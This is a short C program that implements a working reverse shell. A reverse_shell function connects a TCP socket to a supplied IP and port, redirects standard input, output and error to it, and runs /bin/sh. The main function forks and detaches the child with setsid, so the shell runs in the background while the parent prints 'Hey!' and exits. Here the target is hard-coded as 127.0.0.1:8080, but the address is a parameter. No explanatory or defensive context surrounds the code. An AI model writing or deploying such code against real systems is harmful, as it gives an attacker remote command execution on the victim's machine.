#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <fcntl.h>

void reverse_shell(const char *ip, int port) {
	printf("%d. %d\n", AF_INET, SOCK_STREAM);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr.s_addr = inet_addr(ip)
    };

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/sh", "sh", NULL);
    }
    close(sock);
}

int main() {
    pid_t pid = fork();
    if (pid > 0)
    {

        printf("Hey!\n");
        printf("mort..\n");
        return 1;

    }
    setsid();
	reverse_shell("127.0.0.1", 8080);
    return 0;
}
